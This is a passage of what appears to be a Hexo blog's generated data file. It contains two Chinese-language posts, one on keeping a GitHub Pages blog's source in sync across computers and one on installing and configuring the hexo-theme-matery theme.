将公钥填写到github</p>\n</blockquote>\n<blockquote>\n<p>ssh -T <a href=\"mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;\">&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;</a> 测试是否连上github</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<div align=\"middle\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1997527356&auto=1&height=66\"></iframe>\n</div>\n\n<h2 id=\"换机操作前\"><a href=\"#换机操作前\" class=\"headerlink\" title=\"换机操作前\"></a>换机操作前</h2><blockquote>\n<p>在仓库中创建一个hexo[<code>写作仓库</code>]分支并设置为默认</p>\n</blockquote>\n<blockquote>\n<p>在本地配置好ssh连接，并测试是否连通github</p>\n</blockquote>\n<blockquote>\n<p>git clone 这个仓库，因为设置成默认分支，所以直接clone的就是hexo</p>\n</blockquote>\n<blockquote>\n<p>将hexo分支下除了.git的文件全部删除，再将源文件中除了.deploy_git的所有文件拷贝到这里，如果安装了主题，需要将主题中的.git文件夹删除。原理就是hexo的源码和配置不会上传到github，只是上传的.deploy_git里面通过hexo g这个命令生成的静态文件，.deploy_git里面的文件会上传到哪里，这个你在项目目录_config.yaml中配置的，这里配置了上传到哪里，上传到哪个分支，因为这个.deploy_git是可以根据hexo g来生成，所以不用上传,即是说： <code>新拉下来的这个仓库是存放源代码的，如果是第一次做这个操作，需要将其他的文件全部删除，只留下一个.git文件夹，这是仓库信息，然后将源代码里面的除了.deploy_git的所有数据全部复制过来</code></p>\n</blockquote>\n<blockquote>\n<p>添加一个.gitignore文件(可选)</p>\n</blockquote>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\">.DS_Store\nThumbs.db\ndb.json\n<span class=\"token important\">*.log</span>\nnode_modules/\npublic/\n.deploy<span class=\"token important\">*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-shel\" data-language=\"shel\"><code class=\"language-shel\">git commit -m &quot;desc&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> push origin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<hr>\n<h2 id=\"换了电脑之后\"><a href=\"#换了电脑之后\" class=\"headerlink\" title=\"换了电脑之后\"></a>换了电脑之后</h2><blockquote>\n<p>配置好git的ssh连接</p>\n</blockquote>\n<blockquote>\n<p>安装好Node</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> apt/yum/dnf/yay/pacman <span class=\"token function\">install</span> <span class=\"token function\">node</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>安装hexo依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-cli <span class=\"token parameter variable\">-g</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>将写作仓库克隆</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> cloen <span class=\"token variable\"><span class=\"token variable\">`</span>写作仓库<span class=\"token variable\">`</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>进入克隆下来得写作仓库</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> xxx.github.io<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>安装node依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>安装生成文章推送依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-deployer-git <span class=\"token parameter variable\">--save</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>构建文章</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo g<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>发布文章</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>就可以开始写博客了</p>\n<blockquote>\n<p>如果在已经编辑过的电脑上写博客，那么还需要git pull更新一下</p>\n</blockquote>\n<h2 id=\"多端操作\"><a href=\"#多端操作\" class=\"headerlink\" title=\"多端操作\"></a>多端操作</h2><blockquote>\n<p>在新机子上clone仓库，clone的是源代码分支,然后安装依赖，开始写博客，如果新机子上以前有这个仓库，那么需要git pull更新一下再写</p>\n</blockquote>\n<blockquote>\n<p>在clone的这个仓库中，可以直接写博客，不用删除什么，也可以直接hexo -g -d来将静态页面推送到github，但是每次写完了，静态代码推送完了，然后删除.deploy_git文件夹，最后通过git将源码上传到仓库。</p>\n</blockquote>\n<h2 id=\"git配置ssh\"><a href=\"#git配置ssh\" class=\"headerlink\" title=\"git配置ssh\"></a>git配置ssh</h2><blockquote>\n<p>ssh-keygen -t rsa -C “邮箱” 通过这个来生成rsa密钥</p>\n</blockquote>\n<blockquote>\n<p>生成的ras存放在用户目录下的.ssh文件夹中</p>\n</blockquote>\n<blockquote>\n<p>cat id_rsa.pub 将公钥填写到github</p>\n</blockquote>\n<blockquote>\n<p>ssh -T <a href=\"mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;\">&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;</a> 测试是否连上github</p>\n</blockquote>\n"},{"title":"theme-install","top":true,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-15T09:09:28.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"hexo+github+cheme部署","_content":"\n<div align=\"middle\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1869507838&auto=1&height=66\"></iframe>\n</div>\n\n## 下载\n\n本主题**推荐你使用 Hexo 5.0.0 及以上的版本**。如果，你已经有一个自己的 [Hexo](https://hexo.io/zh-cn/) 博客了，建议你将 Hexo 升级到最新稳定的版本。\n\n点击 [这里](https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master) 下载 `master` 分支的最新稳定版的代码，解压缩后，将 `hexo-theme-matery` 的文件夹复制到你 Hexo 的 `themes` 文件夹中即可。\n\n当然你也可以在你的 `themes` 文件夹下使用 `git clone` 命令来下载:\n\n```bash\ngit clone https://github.com/blinkfox/hexo-theme-matery.git\n```\n\n## 配置(主要还是看项目的_config.yml和主题的_config.yml)\n\n### 切换主题\n\n修改 Hexo 根目录下的 `_config.yml` 的  `theme` 的值：`theme: hexo-theme-matery`\n\n#### `_config.yml` 文件的其它修改建议:\n\n- 请修改主目录中 `_config.yml` 的 `url` 的值为你的网站主 `URL`（如：`http://lqs-1.github.io`）。\n- 建议修改目录中 `_config.yml` 的两个 `per_page` 的分页条数值为 `6` 的倍数，如：`12`、`18` 等，这样文章列表在各个屏幕下都能较好的显示。\n- 如果你是中文用户，则建议修改目录中 `_config.yml` 的 `language` 的值为 `zh-CN`。\n\n### 新建分类 categories 页\n\n`categories` 页是用来展示所有分类的页面，如果在你的博客 `source` 目录下还没有 `categories/index.md` 文件，那么你就需要新建一个，命令如下：\n\n```bash\nhexo new page \"categories\"\n```\n\n编辑你刚刚新建的页面文件 `/source/categories/index.md`，至少需要以下内容：\n\n```yaml\n---\ntitle: categories\ndate: 2018-09-30 17:25:30\ntype: \"categories\"\nlayout: \"categories\"\n---\n```\n\n### 新建标签 tags 页\n\n`tags` 页是用来展示所有标签的页面，如果在你的博客 `source` 目录下还没有 `tags/index.md` 文件，那么你就需要新建一个，命令如下：\n\n```bash\nhexo new page \"tags\"\n```\n\n编辑你刚刚新建的页面文件 `/source/tags/index.md`，至少需要以下内容：\n\n```yaml\n---\ntitle: tags\ndate: 2018-09-30 18:23:38\ntype: \"tags\"\nlayout: \"tags\"\n---\n```\n### 新建 404 页\n\n如果在你的博客 `source` 目录下还没有 `404.md` 文件，那么你就需要新建一个\n\n```bash\ntouch 404.md\n```\n\n编辑你刚刚新建的页面文件 `/source/404/index.md`，至少需要以下内容：\n\n```yaml\n---\ntitle: 404\ndate: 2018-09-30 17:25:30\ntype: \"404\"\nlayout: \"404\"\ndescription: \"Oops～，我崩溃了！找不到你想要的页面 :(\"\n---\n```\n\n### 菜单导航配置\n\n#### 配置基本菜单导航的名称、路径url和图标icon.\n\n1.菜单导航名称可以是中文也可以是英文(如：`Index`或`主页`) \n2.图标icon 可以在[Font Awesome](https://fontawesome.com/icons) 中查找   \n\n```yaml\nmenu:\n  Index:\n    url: /\n    icon: fas fa-home\n  Tags:\n    url: /tags\n    icon: fas fa-tags\n  Categories:\n    url: /categories\n    icon: fas fa-bookmark\n  Archives:\n    url: /archives\n    icon: fas fa-archive\n```\n\n#### 二级菜单配置方法\n\n如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作\n     \n1. 在需要添加二级菜单的一级菜单下添加`children`关键字(如:`About`菜单下添加`children`)     \n2. 在`children`下创建二级菜单的 名称name,路径url和图标icon.      \n3. 注意每个二级菜单模块前要加 `-`.     \n4. 注意缩进格式  \n\n```yaml\nmenu:\n  Index:\n    url: /\n    icon: fas fa-home\n  Tags:\n    url: /tags\n    icon: fas fa-tags\n  Categories:\n    url: /categories\n    icon: fas fa-bookmark\n  Archives:\n    url: /archives\n    icon: fas fa-archive\n  About:\n    url: /about\n    icon: fas fa-user-circle-o\n  Friends:\n    url: /friends\n    icon: fas fa-address-book\n  Medias:\n    icon: fas fa-list\n    children:\n      - name: Music\n        url: /music\n        icon: fas fa-music\n      - name: Movies\n        url: /movies\n        icon: fas fa-film\n      - name: Books\n        url: /books\n        icon: fas fa-book\n      - name: Galleries\n        url: /galleries\n        icon: fas fa-image\n```\n\n执行 `hexo clean && hexo g` 重新生成博客文件，然后就可以在文章中对应位置看到你用`emoji`语法写的表情了。\n\n\n\n### 代码高亮\n\n从 Hexo5.0 版本开始自带了 `prismjs` 代码语法高亮的支持，本主题对此进行了改造支持。\n\n如果你的博客中曾经安装过 `hexo-prism-plugin` 的插件，那么你须要执行 `npm uninstall hexo-prism-plugin` 来卸载掉它，否则生成的代码中会有 `&#123;` 和 `&#125;` 的转义字符。\n\n然后，修改 Hexo 根目录下 `_config.yml` 文件中 `highlight.enable` 的值为 `false`，并将 `prismjs.enable` 的值设置为 `true`，主要配置如下：\n\n```yaml\nhighlight:\n  enable: false\n  line_number: true\n  auto_detect: false\n  tab_replace: ''\n  wrap: true\n  hljs: false\nprismjs:\n  enable: true\n  preprocess: true\n  line_number: true\n  tab_replace: ''\n```\n\n主题中默认的 `prismjs` 主题是 `Tomorrow Night`，如果你想定制自己的主题，可以前往 [prismjs 下载页面](https://prismjs.com/download.html) 定制下载自己喜欢的主题 `css` 文件，然后将此 css 主题文件取名为 `prism.css`，替换掉 `hexo-theme-matery` 主题文件夹中的 `source/libs/prism/prism.css` 文件即可。\n\n### 搜索\n\n本主题中还使用到了 [hexo-generator-search](https://github.com/wzpan/hexo-generator-search) 的 Hexo 插件来做内容搜索，安装命令如下：\n\n```bash\nnpm install hexo-generator-search --save\n```\n\n在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项：\n\n```yaml\nsearch:\n  path: search.xml\n  field: post\n```\n\n### 中文链接转拼音（建议安装）\n\n如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 `SEO`，且 `gitment` 评论对中文链接也不支持。我们可以用 [hexo-permalink-pinyin](https://github.com/viko16/hexo-permalink-pinyin) Hexo 插件使在生成文章时生成中文拼音的永久链接。\n\n安装命令如下：\n\n```bash\nnpm i hexo-permalink-pinyin --save\n```\n\n在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项：\n\n```yaml\npermalink_pinyin:\n  enable: true\n  separator: '-' # default: '-'\n```\n\n> **注**：除了此插件外，[hexo-abbrlink](https://github.com/rozbo/hexo-abbrlink) 插件也可以生成非中文的链接。\n\n### 文章字数统计插件（建议安装）\n\n如果你想要在文章中显示文章字数、阅读时长信息，可以安装 [hexo-wordcount](https://github.com/willin/hexo-wordcount)插件。\n\n安装命令如下：\n\n```bash\nnpm i --save hexo-wordcount\n```\n\n然后只需在本主题下的 `_config.yml` 文件中，将各个文章字数相关的配置激活即可：\n\n```yaml\npostInfo:\n  date: true\n  update: false\n  wordCount: false # 设置文章字数统计为 true.\n  totalCount: false # 设置站点文章总字数统计为 true.\n  min2read: false # 阅读时长.\n  readCount: false # 阅读次数.\n```\n\n### 修改社交链接\n\n在主题的 `_config.yml` 文件中，默认支持 `QQ`、`GitHub` 和邮箱等的配置。\n\n### 添加网易云音乐BGM\n\n首先打开网易云网页版，找到想听的歌曲，然后点击生成外链\n\n复制如下代码：\n\n```yaml\n<div align=\"middle\">这里粘贴刚刚复制的代码</div>\n```\n\n\n### 修改打赏的二维码图片\n\n在主题文件的 `source/medias/reward` 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。\n\n\n\n## 文章 Front-matter 介绍\n\n### Front-matter 选项详解\n\n`Front-matter` 选项中的所有内容均为**非必填**的。但我仍然建议至少填写 `title` 和 `date` 的值。\n\n| 配置选项   | 默认值                      | 描述                                                         |\n| ---------- | --------------------------- | ------------------------------------------------------------ |\n| title      | `Markdown` 的文件标题        | 文章标题，强烈建议填写此选项                                 |\n| date       | 文件创建时的日期时间          | 发布时间，强烈建议填写此选项，且最好保证全局唯一             |\n| author     | 根 `_config.yml` 中的 `author` | 文章作者                                                     |\n| img        | `featureImages` 中的某个值   | 文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: `http://xxx.com/xxx.jpg` |\n| top        | `true`                      | 推荐文章（文章是否置顶），如果 `top` 值为 `true`，则会作为首页推荐文章 |\n| cover      | `false`                     | `v1.0.2`版本新增，表示该文章是否需要加入到首页轮播封面中 |\n| coverImg   | 无                          | `v1.0.2`版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片 |\n| password   | 无                          | 文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 `password` 的值，该值必须是用 `SHA256` 加密后的密码，防止被他人识破。前提是在主题的 `config.yml` 中激活了 `verifyPassword` 选项 |\n| toc        | `true`                      | 是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 `config.yml` 中激活了 `toc` 选项 |\n| mathjax    | `false`                     | 是否开启数学公式支持 ，本文章是否开启 `mathjax`，且需要在主题的 `_config.yml` 文件中也需要开启才行 |\n| summary    | 无                          | 文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要 |\n| categories | 无                          | 文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类 |\n| tags       | 无                          | 文章标签，一篇文章可以多个标签                              |\n| keywords   | 文章标题                     | 文章关键字，SEO 时需要                              |\n| reprintPolicy | cc_by                    | 文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个 |\n\n> **注意**:\n> 1. 如果 `img` 属性不填写的话，文章特色图会根据文章标题的 `hashcode` 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章的特色图**各有特色**。\n> 2. `date` 的值尽量保证每篇文章是唯一的，因为本主题中 `Gitalk` 和 `Gitment` 识别 `id` 是通过 `date` 的值来作为唯一标识的。\n> 3. 如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 `_config.yml` 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：[开源中国在线工具](http://tool.oschina.net/encrypt?type=2)、[chahuo](http://encode.chahuo.com/)、[站长工具](http://tool.chinaz.com/tools/hash.aspx)。\n> 4. 您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则\n\n以下为文章的 `Front-matter` 示例。\n\n### 最简示例\n\n```yaml\n---\ntitle: typora-vue-theme主题介绍\ndate: 2018-09-07 09:25:00\n---\n```\n\n### 最全示例\n\n```yaml\n---\ntitle: typora-vue-theme主题介绍\ndate: 2018-09-07 09:25:00\nauthor: 赵奇\nimg: /source/images/xxx.jpg\ntop: true\ncover: true\ncoverImg: /images/1.jpg\npassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\ntoc: false\nmathjax: false\nsummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\ncategories: Markdown\ntags:\n  - Typora\n  - Markdown\n---\n```\n\n## 效果截图\n\n![首页](http://static.blinkfox.com/matery-20181202-1.png)\n\n![首页推荐文章](http://static.blinkfox.com/matery-20181202-2.png)\n\n![首页文章列表](http://static.blinkfox.com/matery-20181202-3.png)\n\n![首页文章列表](http://static.blinkfox.com/matery-20181202-7.png)\n\n![首页文章列表](http://static.blinkfox.com/matery-20181202-8.png)\n\n## 自定制修改\n\n在本主题的 `_config.yml` 中可以修改部分自定义信息，有以下几个部分：\n\n- 菜单\n- 我的梦想\n- 首页的音乐播放器和视频播放器配置\n- 是否显示推荐文章名称和按钮配置\n- `favicon` 和 `Logo`\n- 个人信息\n- TOC 目录\n- 文章打赏信息\n- 复制文章内容时追加版权信息\n- MathJax\n- 文章字数统计、阅读时长\n- 点击页面的'爱心'效果\n- 我的项目\n- 我的技能\n- 我的相册\n- `Gitalk`、`Gitment`、`Valine` 和 `disqus` 评论配置\n- [不蒜子统计](http://busuanzi.ibruce.info/)和谷歌分析（`Google Analytics`）\n- 默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 `hashcode` 值取余，来选择展示对应的特色图\n\n**我认为个人博客应该都有自己的风格和特色**。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 `_config.yml` 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：\n\n### 修改主题颜色\n\n在主题文件的 `/source/css/matery.css` 文件中，搜索 `.bg-color` 来修改背景颜色：\n\n```css\n/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */\n.bg-color {\n    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);\n}\n\n@-webkit-keyframes rainbow {\n   /* 动态切换背景颜色. */\n}\n\n@keyframes rainbow {\n    /* 动态切换背景颜色. */\n}\n```\n\n### 修改 banner 图和文章特色图\n\n你可以直接在 `/source/medias/banner` 文件夹中更换你喜欢的 `banner` 图片，主题代码中是每天动态切换一张，只需 `7` 张即可。如果你会 `JavaScript` 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，`banner` 切换的代码位置在 `/layout/_partial/bg-cover-content.ejs` 文件的 `<script></script>` 代码中：\n\n```javascript\n$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');\n```\n\n在 `/source/medias/featureimages` 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 `_config.yml` 做同步修改。\n\n","source":"_posts/theme-install.md","raw":"---\ntitle: theme-install\ntop: true\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-15 17:09:28\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: hexo+github+cheme部署\ntags: hexo\ncategories: 博客部署\n---\n\n<div align=\"middle\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1869507838&auto=1&height=66\"></iframe>\n</div>\n\n## 下载\n\n本主题**推荐你使用 Hexo 5.0.0 及以上的版本**。如果，你已经有一个自己的 [Hexo](https://hexo.io/zh-cn/) 博客了，建议你将 Hexo 升级到最新稳定的版本。\n\n点击 [这里](https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master) 下载 `master` 分支的最新稳定版的代码，解压缩后，将 `hexo-theme-matery` 的文件夹复制到你 Hexo 的 `themes` 文件夹中即可。\n\n当然你也可以在你的 `themes` 文件夹下使用 `git clone` 命令来下载:\n\n```bash\ngit clone https://github.com/blinkfox/hexo-theme-matery.git\n```\n\n## 配置(主要还是看项目的_config.yml和主题的_config.yml)\n\n### 切换主题\n\n修改 Hexo 根目录下的 `_config.yml` 的  `theme` 的值：`theme: hexo-theme-matery`\n\n#### `_config.yml` 文件的其它修改建议:\n\n- 请修改主目录中 `_config.yml` 的 `url` 的值为你的网站主 `URL`（如：`http://lqs-1.github.io`）。\n- 建议修改目录中 `_config.yml` 的两个 `per_page` 的分页条数值为 `6` 的倍数，如：`12`、`18` 等，这样文章列表在各个屏幕下都能较好的显示。\n- 如果你是中文用户，则建议修改目录中 `_config.yml` 的 `language` 的值为 `zh-CN`。\n\n### 新建分类 categories 页\n\n`categories` 页是用来展示所有分类的页面，如果在你的博客 `source` 目录下还没有 `categories/index.md` 文件，那么你就需要新建一个，命令如下：\n\n```bash\nhexo new page \"categories\"\n```\n\n编辑你刚刚新建的页面文件 `/source/categories/index.md`，至少需要以下内容：\n\n```yaml\n---\ntitle: categories\ndate: 2018-09-30 17:25:30\ntype: \"categories\"\nlayout: \"categories\"\n---\n```\n\n### 新建标签 tags 页\n\n`tags` 页是用来展示所有标签的页面，如果在你的博客 `source` 目录下还没有 `tags/index.md` 文件，那么你就需要新建一个，命令如下：\n\n```bash\nhexo new page \"tags\"\n```\n\n编辑你刚刚新建的页面文件 `/source/tags/index.md`，至少需要以下内容：\n\n```yaml\n---\ntitle: tags\ndate: 2018-09-30 18:23:38\ntype: \"tags\"\nlayout: \"tags\"\n---\n```\n### 新建 404 页\n\n如果在你的博客 `source` 目录下还没有 `404.md` 文件，那么你就需要新建一个\n\n```bash\ntouch 404.md\n```\n\n编辑你刚刚新建的页面文件 `/source/404/index.md`，至少需要以下内容：\n\n```yaml\n---\ntitle: 404\ndate: 2018-09-30 17:25:30\ntype: \"404\"\nlayout: \"404\"\ndescription: \"Oops～，我崩溃了！找不到你想要的页面 :(\"\n---\n```\n\n### 菜单导航配置\n\n#### 配置基本菜单导航的名称、路径url和图标icon.\n\n1.菜单导航名称可以是中文也可以是英文(如：`Index`或`主页`) \n2.图标icon 可以在[Font Awesome](https://fontawesome.com/icons) 中查找   \n\n```yaml\nmenu:\n  Index:\n    url: /\n    icon: fas fa-home\n  Tags:\n    url: /tags\n    icon: fas fa-tags\n  Categories:\n    url: /categories\n    icon: fas fa-bookmark\n  Archives:\n    url: /archives\n    icon: fas fa-archive\n```\n\n#### 二级菜单配置方法\n\n如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作\n     \n1. 在需要添加二级菜单的一级菜单下添加`children`关键字(如:`About`菜单下添加`children`)     \n2. 在`children`下创建二级菜单的 名称name,路径url和图标icon.      \n3. 注意每个二级菜单模块前要加 `-`.     \n4. 注意缩进格式  \n\n```yaml\nmenu:\n  Index:\n    url: /\n    icon: fas fa-home\n  Tags:\n    url: /tags\n    icon: fas fa-tags\n  Categories:\n    url: /categories\n    icon: fas fa-bookmark\n  Archives:\n    url: /archives\n    icon: fas fa-archive\n  About:\n    url: /about\n    icon: fas fa-user-circle-o\n  Friends:\n    url: /friends\n    icon: fas fa-address-book\n  Medias:\n    icon: fas fa-list\n    children:\n      - name: Music\n        url: /music\n        icon: fas fa-music\n      - name: Movies\n        url: /movies\n        icon: fas fa-film\n      - name: Books\n        url: /books\n        icon: fas fa-book\n      - name: Galleries\n        url: /galleries\n        icon: fas fa-image\n```\n\n执行 `hexo clean && hexo g` 重新生成博客文件，然后就可以在文章中对应位置看到你用`emoji`语法写的表情了。\n\n\n\n### 代码高亮\n\n从 Hexo5.0 版本开始自带了 `prismjs` 代码语法高亮的支持，本主题对此进行了改造支持。\n\n如果你的博客中曾经安装过 `hexo-prism-plugin` 的插件，那么你须要执行 `npm uninstall hexo-prism-plugin` 来卸载掉它，否则生成的代码中会有 `&#123;` 和 `&#125;` 的转义字符。\n\n然后，修改 Hexo 根目录下 `_config.yml` 文件中 `highlight.enable` 的值为 `false`，并将 `prismjs.enable` 的值设置为 `true`，主要配置如下：\n\n```yaml\nhighlight:\n  enable: false\n  line_number: true\n  auto_detect: false\n  tab_replace: ''\n  wrap: true\n  hljs: false\nprismjs:\n  enable: true\n  preprocess: true\n  line_number: true\n  tab_replace: ''\n```\n\n主题中默认的 `prismjs` 主题是 `Tomorrow Night`，如果你想定制自己的主题，可以前往 [prismjs 下载页面](https://prismjs.com/download.html) 定制下载自己喜欢的主题 `css` 文件，然后将此 css 主题文件取名为 `prism.css`，替换掉 `hexo-theme-matery` 主题文件夹中的 `source/libs/prism/prism.css` 文件即可。\n\n### 搜索\n\n本主题中还使用到了 [hexo-generator-search](https://github.com/wzpan/hexo-generator-search) 的 Hexo 插件来做内容搜索，安装命令如下：\n\n```bash\nnpm install hexo-generator-search --save\n```\n\n在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项：\n\n```yaml\nsearch:\n  path: search.xml\n  field: post\n```\n\n### 中文链接转拼音（建议安装）\n\n如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 `SEO`，且 `gitment` 评论对中文链接也不支持。我们可以用 [hexo-permalink-pinyin](https://github.com/viko16/hexo-permalink-pinyin) Hexo 插件使在生成文章时生成中文拼音的永久链接。\n\n安装命令如下：\n\n```bash\nnpm i hexo-permalink-pinyin --save\n```\n\n在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项：\n\n```yaml\npermalink_pinyin:\n  enable: true\n  separator: '-' # default: '-'\n```\n\n> **注**：除了此插件外，[hexo-abbrlink](https://github.com/rozbo/hexo-abbrlink) 插件也可以生成非中文的链接。\n\n### 文章字数统计插件（建议安装）\n\n如果你想要在文章中显示文章字数、阅读时长信息，可以安装 [hexo-wordcount](https://github.com/willin/hexo-wordcount)插件。\n\n安装命令如下：\n\n```bash\nnpm i --save hexo-wordcount\n```\n\n然后只需在本主题下的 `_config.yml` 文件中，将各个文章字数相关的配置激活即可：\n\n```yaml\npostInfo:\n  date: true\n  update: false\n  wordCount: false # 设置文章字数统计为 true.\n  totalCount: false # 设置站点文章总字数统计为 true.\n  min2read: false # 阅读时长.\n  readCount: false # 阅读次数.\n```\n\n### 修改社交链接\n\n在主题的 `_config.yml` 文件中，默认支持 `QQ`、`GitHub` 和邮箱等的配置。\n\n### 添加网易云音乐BGM\n\n首先打开网易云网页版，找到想听的歌曲，然后点击生成外链\n\n复制如下代码：\n\n```yaml\n<div align=\"middle\">这里粘贴刚刚复制的代码</div>\n```\n\n\n### 修改打赏的二维码图片\n\n在主题文件的 `source/medias/reward` 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。\n\n\n\n## 文章 Front-matter 介绍\n\n### Front-matter 选项详解\n\n`Front-matter` 选项中的所有内容均为**非必填**的。但我仍然建议至少填写 `title` 和 `date` 的值。\n\n| 配置选项   | 默认值                      | 描述                                                         |\n| ---------- | --------------------------- | ------------------------------------------------------------ |\n| title      | `Markdown` 的文件标题        | 文章标题，强烈建议填写此选项                                 |\n| date       | 文件创建时的日期时间          | 发布时间，强烈建议填写此选项，且最好保证全局唯一             |\n| author     | 根 `_config.yml` 中的 `author` | 文章作者                                                     |\n| img        | `featureImages` 中的某个值   | 文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: `http://xxx.com/xxx.jpg` |\n| top        | `true`                      | 推荐文章（文章是否置顶），如果 `top` 值为 `true`，则会作为首页推荐文章 |\n| cover      | `false`                     | `v1.0.2`版本新增，表示该文章是否需要加入到首页轮播封面中 |\n| coverImg   | 无                          | `v1.0.2`版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片 |\n| password   | 无                          | 文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 `password` 的值，该值必须是用 `SHA256` 加密后的密码，防止被他人识破。前提是在主题的 `config.yml` 中激活了 `verifyPassword` 选项 |\n| toc        | `true`                      | 是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 `config.yml` 中激活了 